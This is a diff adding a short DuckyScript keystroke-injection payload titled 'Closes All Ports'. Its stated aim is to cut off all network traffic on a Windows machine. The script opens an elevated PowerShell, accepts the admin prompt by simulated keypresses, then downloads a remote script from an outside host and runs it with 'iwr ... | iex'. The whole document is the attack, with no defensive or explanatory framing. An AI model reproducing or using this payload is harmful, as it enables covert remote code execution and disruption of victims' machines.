@@ -1,0 +1,20 @@
+REM Title: Closes All Ports
+REM Author: Sorted#0002
+REM Description: This Blocks All Incoming And Outgoing Traffic On Windows Firewall
+
+
+DELAY 750
+WINDOWS d
+DELAY 850
+WINDOWS r
+DELAY 900
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING iwr https://sorted.is-broke.cf/firewallfucker.ps1 -UseBasicParsing | iex; exit
+ENTER
